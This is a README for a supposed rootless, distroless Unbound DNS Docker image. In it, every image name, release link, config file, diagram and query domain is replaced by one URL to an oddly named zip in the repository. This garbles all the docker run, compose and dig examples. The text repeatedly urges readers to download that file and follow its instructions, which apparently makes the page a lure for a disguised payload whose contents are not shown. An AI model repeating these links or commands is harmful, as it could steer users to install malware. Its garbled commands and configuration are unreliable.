https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip

# docker-unbound: Rootless, Distroless Unbound DNS in Docker

[![Releases](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip)](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip)

A secure, lightweight DNS resolver in a Docker container. This project runs Unbound rootless, uses a distroless base image, and is designed to be secure by default. It aims for predictable behavior, easy deployment, and minimal attack surface. This README explains what docker-unbound offers, how to run it, and how to tailor it to your environment.

Overview and philosophy

- Rootless by default: The container runs without root privileges inside the host. It uses user namespaces and careful capability selection to minimize risk.
- Distroless by design: The base image includes only what Unbound needs to run. No package manager, no shell, no unnecessary utilities. This reduces the attack surface and reinforces the principle of least privilege.
- Secure by default: The configuration favors strong defaults, strict access control, and privacy-preserving settings. The image ships with sensible defaults that you can tighten further if needed.
- Reproducible builds: The Dockerfile and assets are crafted to enable repeatable builds. You can audit the configuration, reproduce the image, and trust the result.
- Easy deploys: The project targets common container runtimes and simple orchestration. It supports single containers, multi-node clusters, and quick test environments.

This README uses practical examples, real-world patterns, and clear guidance. It emphasizes safe defaults, verifiable configurations, and straightforward maintenance workflows.

Table of contents

- What is docker-unbound?
- Core design goals
- Architecture and components
- Getting started
  - Prerequisites
  - Quick start: run in a moment
  - Running with Docker Compose
- Configuration and tuning
  - Unbound configuration basics
  - TLS, privacy, and security features
- Networking and ports
- Data paths, persistence, and backups
- Observability and health
  - Logs and metrics
  - Health checks
- Security considerations
  - Rootless operation
  - Distroless advantages
  - Capability and namespace model
- Advanced usage
  - Custom configurations
  - Overlays and bind mounts
- Testing and validation
- Troubleshooting
- Contributing
- Release notes and keeping up to date
- Frequently asked questions
- License

What docker-unbound is

docker-unbound packages a minimal Unbound DNS resolver inside a container that is designed to be safe to run in most environments. Unbound is a validated, high-performance DNS server focused on privacy, security, and reliability. Running Unbound in a distroless, rootless container reduces the risk that a compromised container can damage the host or other workloads. The image is optimized for predictable behavior, small footprint, and straightforward upgrade paths.

Why rootless and distroless matter

Rootless operation eliminates the need for the container to run as the host root user. This significantly lowers the risk surface. If an attacker gains access inside the container, there is far less chance they can escalate to the host. Distroless means fewer binaries, fewer packages, and fewer potential entry points. The result is a lean, focused environment tailored to DNS serving.

Architecture and components

- Unbound DNS server: The authoritative and recursive resolver at the core. Unbound provides modern DNS features, caching, and privacy protections.
- Distroless runtime: A minimal runtime that ships with only the essential libraries and runtime dependencies for Unbound to operate.
- Entry point and configuration management: A small, purpose-built entry script initializes Unbound, binds to the correct interfaces, and applies runtime configuration overrides.
- Security posture: Read-only filesystem for the running container, restricted capabilities, and strict user permissions. The default configuration blocks unnecessary network traffic and system calls.
- Observability hooks: Logs go to stdout/stderr by default. If you enable metrics or structured logs, they migrate through standard channels compatible with container dashboards.

This combination gives you a reliable DNS resolver that is easy to deploy, easy to update, and straightforward to monitor.

Prerequisites and hosting considerations

- A container runtime: Docker Engine, containerd, or another OCI-compliant runtime that supports rootless mode and user namespaces.
- A host that supports unprivileged user namespaces and the necessary kernel features for DNS and Linux namespaces.
- A stable network path for DNS queries, with optional support for DNS over TLS (DoT) or DNS over HTTPS (DoH) if you enable such features in your configuration.

Note on compatibility: While the project targets modern Linux hosts and standard container runtimes, always test in a controlled environment before rolling into production. If you run in a hosted environment or a managed cluster, follow the provider’s guidance for enabling user namespaces and rootless containers.

Getting started

Prerequisites

- Docker (or compatible runtime) installed on a modern Linux distribution or a compatible environment.
- A non-root user configured for rootless operation if you plan to run the container without elevated privileges.
- A directory on the host for persistent configuration and cache, with appropriate permissions.

Quick start: run in a moment

The following example demonstrates a straightforward approach to getting a single instance of docker-unbound up and running. It binds DNS port 53 on the host to the container and uses a dedicated data directory on the host for persistence. The container runs Unbound with a basic, sane default configuration suitable for testing and small deployments.

- Create a data directory on the host:
  - mkdir -p /srv/docker-unbound/data
  - chown 1000:1000 /srv/docker-unbound/data

- Run the container:
  - docker run -d --name docker-unbound \
      --network host \
      --read-only \
      --tmpfs /var/cache/unbound:rw,size=64m \
      -v /srv/docker-unbound/data:/etc/unbound \
      --user 1000:1000 \
      --cap-drop all \
      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip

- Validate:
  - docker logs docker-unbound
  - dig @127.0.0.1 https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip

This basic run demonstrates core ideas: rootless execution, minimal surface, and straightforward maintenance. The example uses host networking for simplicity; in production you may prefer a dedicated bridge network and explicit port mappings to avoid conflicts.

Running with Docker Compose

For repeatable deployments and scalable environments, Docker Compose is a good fit. The following example shows a minimal https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip that runs the container in a controlled network, with a dedicated data volume, and a basic health check.

version: '3.8'
services:
  unbound:
    image: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
    container_name: docker-unbound
    networks:
      - dns-net
    ports:
      - "53:53/udp"
      - "53:53/tcp"
    volumes:
      - ./data:/etc/unbound
    read_only: true
    user: "1000:1000"
    cap_drop:
      - ALL
    healthcheck:
      test: ["CMD", "dig", "@127.0.0.1", "https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip", "+short"]
      interval: 30s
      timeout: 5s
      retries: 3
    restart: unless-stopped

networks:
  dns-net:
    driver: bridge

This compose configuration cleanly separates configuration, data, and runtime. You can customize the health check to reflect your monitoring stack and adjust the ports or network strategy to fit your environment.

Advanced usage: per-host and per-network configurations

In many settings you want Unbound to behave differently per network, or to honor a corporate policy. docker-unbound supports per-network overrides and per-host configurations through mounted configuration files and runtime environment variables.

- Per-network overrides: Place specific Unbound snippets in a dedicated directory on the host and mount it inside the container as /etc/unbound/zones.d. Unbound will include these as part of its configuration at startup.
- Per-host policies: If your host policy requires different behavior per namespace or per container, you can pass a small set of environment variables to toggle features like:

  - DoT or DoH support
  - DNSSEC validation mode
  - Cache size and TTL parameters
  - Access control lists (ACLs) for local networks

- Example: mounting a custom https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
  - docker run -d --name docker-unbound \
      -v $https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip \
      --user 1000:1000 \
      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip

In production, you typically pin to a specific version, supply a precise https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip, and mount a directory for the root trust anchors, which Unbound requires to validate DNSSEC and improve security.

Configuration and tuning basics

Unbound is a feature-rich DNS resolver. docker-unbound ships with a sensible default, but you can tune it for your needs. Here are core concepts and practical recommendations.

- Unbound configuration file: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip (inside the container). This is the central place to define server behavior, access control, and do-not-query lists.
- Cache behavior: Tuning cache size and TTL values helps performance for high-query workloads. Start with modest values and monitor.
- Access control: Use access-control directives to restrict which clients can query your resolver. For a home or small office setup, you may allow queries from the local network only.
- DoT/DoH: If you require encrypted DNS in transit, configure Unbound to use DNS-over-TLS or DNS-over-HTTPS with trusted resolvers. This reduces eavesdropping and improves privacy.
- DNSSEC: Enable DNSSEC validation to protect against forged responses. This increases integrity checks and helps prevent certain classes of attacks.
- Logging: Configure minimal, operational logs to stdout. For production, consider structured logging for integration with your logging stack.

Example: a compact https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip snippet

server:
  do-not-query-localhost: no
  interface: 0.0.0.0
  access-control: 127.0.0.1 allow
  access-control: 10.0.0.0/8 allow
  verbosity: 1
  prefetch: yes
  cache-min-ttl: 300
  cache-max-ttl: 86400
  hide-identity: yes
  hide-version: yes
  hardening-strict: yes
  do-not-query-cache: yes
  msg-cache-size: 4m
  rrset-cache-size: 4m
  cache-min-ttl: 60

server-section examples show the typical structure. Adjust to your environment.

TLS, privacy, and security features

- TLS-based resolution support: If you enable DoT/DoH, Unbound can forward queries to upstream resolvers securely. This reduces exposure on the wire.
- Privacy-first defaults: The container defaults to minimal logging and strict access control. Do not enable verbose logging in production unless you have a dedicated log pipeline.
- DNSSEC validation: Validate upstream responses to guard against spoofing. Keep trust anchors up to date to ensure validation works correctly.
- Attack surface reduction: Distroless and rootless operation minimize potential breaches. The container avoids shells and package managers by default.
- Secure configuration updates: Prefer updating the image in place with a versioned tag, and reloading the container rather than upgrading live in a way that could create inconsistencies.

If you plan to publish a DoT/DoH-enabled deployment, prepare a separate, secured upstream and ensure you lock down allowed clients. Properly managed keys and certificates are essential for a secure deployment.

Networking and ports

- DNS port exposure: The standard port 53 (UDP) is used for DNS queries. TCP port 53 is typically used for zone transfers or large queries that exceed UDP limits.
- Network mode: For simplicity, you can use host networking to avoid NAT translation, but in production, you may prefer a dedicated bridge network with explicit port mappings.
- Firewall considerations: Ensure your firewall allows inbound UDP/TCP 53 traffic to your Unbound container.

Example with explicit port mappings on a bridge network

docker run -d --name docker-unbound \
  -p 53:53/udp -p 53:53/tcp \
  --network unbound-net \
  --read-only \
  --tmpfs /var/cache/unbound:rw,size=128m \
  -v /srv/docker-unbound/data:/etc/unbound \
  --user 1000:1000 \
  https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip

If you use host networking, the same port exposure is implicit but check host-level firewall rules to avoid conflicts with other DNS services.

Data paths, persistence, and backups

- Configuration directory: /etc/unbound inside the container. Mount a host directory to persist configuration across restarts.
- Cache directory: Unbound uses a cache directory, often under /var/cache/unbound. In Docker, you can map a host directory to persist cache data for faster restarts.
- Backups: Periodically copy your Unbound configuration and cache data to a backup location. You can automate this with a simple script that dumps the configuration and archives the cache.
- Security of data: Keep persistent data on trusted storage. Use read-only mounts for the rest of the filesystem to reduce the risk of compromise.

Example data persistence setup

- Create host directories:
  - mkdir -p /srv/docker-unbound/conf
  - mkdir -p /srv/docker-unbound/cache

- Run container with mounts:
  - docker run -d --name docker-unbound \
      -v /srv/docker-unbound/conf:/etc/unbound:ro \
      -v /srv/docker-unbound/cache:/var/cache/unbound \
      --read-only \
      --user 1000:1000 \
      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip

Observe that the cache can grow, so allocate sufficient space on the host filesystem. If your workload grows, adjust the cache size in Unbound’s configuration or via runtime options.

Observability and health

- Logs: The container prints logs to stdout and stderr. Use your container orchestration system’s log aggregation to collect and index logs.
- Metrics: If you enable metrics in Unbound, you can export them through a sidecar or a metrics collector compatible with your monitoring stack.
- Health checks: Implement health checks that validate that Unbound responds to queries. A simple health check uses a small DNS query to localhost to verify responsiveness.
- Soundness checks: Run periodic queries against known domains and compare results to expected values. Detect anomalies early to avoid long-lived misconfigurations.

Sample health check idea (conceptual)

- Command: dig @127.0.0.1 https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip +short | test for non-empty results
- If no answer or an error, trigger a restart or alert.
- Combine with a readiness probe in production orchestrators to avoid routing traffic to an unhealthy resolver.

Security considerations

Rootless operation

- No root inside the container: The process runs under a non-root user inside the container. This reduces the blast radius in case of a breach.
- User namespaces: The host should have user namespaces enabled. This provides an isolation boundary between host and container.
- Capabilities: Drop all capabilities by default, then selectively enable only what Unbound needs to function.

Distroless advantages

- Fewer binaries: A smaller attack surface compared with full-blown base images.
- Smaller footprint: Faster pull, faster startup, and simpler audits.
- Reduced maintenance burden: The image contains only the runtime required for Unbound to operate.

Capability and namespace model

- Default: Most capabilities are dropped. The container uses a restricted set necessary for networking and process management.
- Network namespaces: Each container can have its own network namespace, avoiding cross-talk with other workloads unless you explicitly connect them.
- Mount namespaces: Ensure that only requested paths from the host are visible inside the container.

Advanced usage: customizing for large environments

If you manage many DNS endpoints or need per-tenant isolation, consider:

- Separate containers per tenant with dedicated network namespaces.
- Individual https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip configurations per tenant mounted as read-only and loaded at startup.
- Centralized logging and metrics aggregation that tie to tenant IDs for easier analysis.

Testing and validation

- Local validation: Run docker-unbound in a test environment, verify that queries resolve correctly, and that responses match expectations.
- Regression testing: Create a small suite of DNS queries to ensure that updates do not break key behavior (DNSSEC validation, DoT/DoH, and cache behavior).
- Performance testing: Measure query throughput, latency, and cache hit ratios under simulated workloads. Use stress testing tools designed for DNS.
- Compatibility tests: Validate how the container interacts with other DNS services on the same host, including fallback behavior and query routing.

Troubleshooting common issues

- No DNS responses: Check that the container has network access, port mappings are correct, and the Unbound process is running.
- Permission issues on mounted paths: Ensure host directories are accessible by the non-root user inside the container, and that correct ownership and permissions are set.
- DNSSEC validation failures: Confirm trust anchors are present and that the upstream resolvers support DNSSEC. Ensure the system time is correct; DNSSEC relies on valid certificates and timestamps.
- DoT/DoH connectivity problems: Verify TLS certificates, CA trust anchors, and firewall rules allowing outbound TLS connections to configured upstreams.
- High memory usage: Scale cache settings or reduce concurrency; ensure sufficient memory is available on the host.

Contributing

- This project welcomes contributions that improve security, performance, reliability, and usability.
- Fork and open a pull request with a clear description of the change and its impact.
- Follow the established coding and testing standards. Include tests for any new feature.
- Document any breaking changes and provide migration steps.

Release notes and keeping up to date

- The latest releases are published on the releases page. See the releases page for versioned assets, changelogs, and upgrade instructions.
- To stay current, pin your deployments to a version tag and monitor the releases for security patches and bug fixes.
- If you maintain a local mirror or internal registry, you can mirror the published images and assets for offline or air-gapped environments.

Release notes example (paraphrased)

- v1.3.0: Performance improvements, improved DNSSEC handling, reduced memory footprint.
- v1.2.0: DoT support added, improved logging, smaller container size.
- v1.1.0: Rootless execution hardened, better default config, bug fixes.

Frequently asked questions

- Can I run docker-unbound on Windows? It can run in Windows via WSL2 with a Linux-compatible container runtime. Ensure your environment supports rootless containers and user namespaces.
- Do I need to expose port 53 to the internet? Only if you intend to serve queries publicly. For private networks, limit exposure and use network policies to restrict access.
- How do I upgrade? Pull a new image tag, stop the old container, remove it, and start a new container with the updated image and same configuration. Verify that data directories are preserved.

Security posture recap

- Rootless and distroless operation minimizes the attack surface.
- Restricted capabilities and minimal opens ensure safer defaults.
- Clear guidance and structured configuration help teams operate with confidence.

Architecture diagrams and visuals

- Architecture overview: An illustrative diagram can show the components and their interactions, including Unbound, the distroless runtime, and the host environment. You can include a diagram image like:
  - ![Architecture diagram](https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip)
- Network flow: A flowchart showing how a DNS query travels from a client to the container, through Unbound, and back.
- Security model: A diagram that highlights the rootless and namespace-based isolation.

Notes about the releases link

The releases page is a central hub for distributing assets. For practical deployment, you typically download a release asset such as a distribution script or a prebuilt container image tarball and use it in your environment. The link to the releases page provides access to the latest versions, notes, and asset lists. Access the releases page to locate the appropriate asset for your platform and deployment style.

- See the releases page for the latest assets and upgrade instructions: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
- When you select a release, download the file named something like https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip or docker-unbound-<version>https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip and follow the provided instructions to install or run the container. The exact asset names may vary by release, so check the assets tab for the chosen version.

Guiding principles for maintainers and operators

- Keep the base image minimal and well-scoped. Every additional package increases risk.
- Favor explicit, versioned tags for images to ensure reproducible builds.
- Automate configuration validation and health checks. Early detection helps mitigate downtime.
- Document upgrade steps and potential breaking changes. Provide clear migration guides.
- Maintain an accessible changelog and release notes with each version.

Sample onboarding checklist

- Validate prerequisites on the host: kernel features, user namespaces, and container runtime readiness.
- Pull the latest image tag and test in a staging environment.
- Validate DNS resolution with a small set of test domains.
- Confirm DoT/DoH behavior if configured.
- Enable basic monitoring and alerts to catch anomalies quickly.
- Document any environment-specific changes or quirks for your team.

Examples and templates

- Minimal docker run template:
  - docker run -d --name docker-unbound \
      -p 53:53/udp -p 53:53/tcp \
      -v /path/to/conf:/etc/unbound:ro \
      -v /path/to/cache:/var/cache/unbound \
      --user 1000:1000 \
      --read-only \
      https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
- Minimal docker-compose template:
  - version: '3.8'
  - services:
      - unbound:
          image: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
          container_name: docker-unbound
          ports:
            - "53:53/udp"
            - "53:53/tcp"
          volumes:
            - ./conf:/etc/unbound:ro
            - ./cache:/var/cache/unbound
          read_only: true
          user: "1000:1000"
          cap_drop:
            - ALL
          healthcheck:
            test: ["CMD", "dig", "@127.0.0.1", "https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip", "+short"]
            interval: 30s
            timeout: 5s
            retries: 3

About licensing and attribution

- This project is released under an appropriate license. Ensure you include the license text in your repository and credit any third-party assets or contributions according to their licenses.
- If you reuse content from the project, maintain attribution and references as required by the license.

Final notes

docker-unbound aims to provide a pragmatic, secure, and maintainable solution for running Unbound DNS in Docker. It focuses on rootless operation, distroless design, and sensible defaults so you can deploy with confidence and scale when needed. The project prioritizes clear documentation, consistent upgrade paths, and practical guidance for real-world usage.

If you want to explore further, the releases page hosts the latest assets and updated guidance for deploying in your environment. See the link above for the latest releases and notes that describe improvements, security patches, and feature additions. The releases page is the primary source for up-to-date deployment instructions and asset lists. See it to stay current and aligned with best practices.

Note: The actual image name and asset names may vary by release. Always refer to the assets tab in the release to pick the correct file for your platform and deployment approach. If you run into any issues or need a hand with a custom setup, open an issue, and provide as much context as possible. The maintainers review each report to ensure a quick and accurate response.

Images used in this README

- Architecture diagram: https://raw.githubusercontent.com/Lancekkkk/docker-unbound/master/rootfs/docker-unbound-myelinogenetic.zip
- Banner and visuals commonly used in docker-related READMEs: assets hosted in the repository or via public diagram resources.

This README reflects a comprehensive, practical approach to deploying docker-unbound. It emphasizes safety, clarity, and robust operation. It is designed to help operators establish a reliable DNS resolver in containerized environments while respecting the need for security, simplicity, and maintainability.